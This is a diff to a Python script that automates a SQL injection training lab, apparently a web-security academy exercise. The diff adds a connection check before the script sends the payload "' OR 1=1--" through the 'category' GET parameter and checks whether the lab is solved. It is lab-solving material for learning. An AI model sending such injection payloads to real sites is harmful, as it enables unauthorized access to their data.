@@ -6,6 +6,7 @@ import logging
 import argparse
 import urllib3
 import urllib.parse
+import urllib.request
 
 from colorama import Fore, Style
 import requests
@@ -31,6 +32,12 @@ def normalize_url(url):
         url = url + "/"
     return url
 
+def is_url_reachable(url):
+    try:
+        urllib.request.urlopen(url)
+        return True
+    except:
+        return False
 
 def Exploit_SQLi(url, payload, no_proxy):
     uri = "filter?category="
@@ -54,7 +61,8 @@ def is_solved(url, no_proxy):
     else:
         sleep(2)
         Get_Response(url, no_proxy)
-        
+
+
 if __name__ == "__main__":
     
     try: 
@@ -82,29 +90,38 @@ if __name__ == "__main__":
         sleep(1)
         log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Target URL: " + url)
         sleep(1)
-        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
-        log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " GET parameter 'category' is vulnerable to SQL injection")
-        payload = "' OR 1=1--"
-        sleep(1)
-        log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload)
-        sleep(1)
-        encoded_url = urllib.parse.quote(url + uri, safe='')
-        encoded_payload = urllib.parse.quote(payload, safe='')
-        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Exploit URL: " + Style.BRIGHT + Fore.YELLOW + url + uri + Style.BRIGHT + Fore.RED + payload)
-        sleep(1)
-        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Encoded URL: " + Style.BRIGHT + Fore.YELLOW + encoded_url + Style.BRIGHT + Fore.RED + encoded_payload)
-        sleep(1)
-        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Sending ... ")
-        sleep(1)
-        Exploit_SQLi(url, payload, args.no_proxy)
+        log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")
 
-        if is_solved(url, args.no_proxy):
-            print("\n")
-            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " SQL injection exploited successfully :)")
-            log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !")
+        if is_url_reachable(url):
+
+            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing the GET parameter 'category'")
+            log.info(Style.BRIGHT  + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " GET parameter 'category' is vulnerable to SQL injection")
+            payload = "' OR 1=1--"
+            sleep(1)
+            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload)
+            sleep(1)
+            encoded_url = urllib.parse.quote(url + uri, safe='')
+            encoded_payload = urllib.parse.quote(payload, safe='')
+            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Exploit URL: " + Style.BRIGHT + Fore.YELLOW + url + uri + Style.BRIGHT + Fore.RED + payload)
+            sleep(1)
+            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Encoded URL: " + Style.BRIGHT + Fore.YELLOW + encoded_url + Style.BRIGHT + Fore.RED + encoded_payload)
+            sleep(1)
+            log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.WHITE + " Sending ... ")
+            sleep(1)
+            Exploit_SQLi(url, payload, args.no_proxy)
+
+            if is_solved(url, args.no_proxy):
+                print("\n")
+                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " SQL injection exploited successfully :)")
+                log.info(Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Style.BRIGHT + Fore.WHITE + " The Lab should now be solved. Congrats !")
+            else: 
+                print("\n")
+                log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " SQL injection unsuccessfully :(")
+        
         else: 
-            print("\n")
-            log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " SQL injection unsuccessfully :(")
+            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Unable to connect to the target URL")
+            log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " If the problem persists, please check that the provided target URL is reachable.")
+            sys.exit(-1)
 
     except KeyboardInterrupt:
         print("\n")
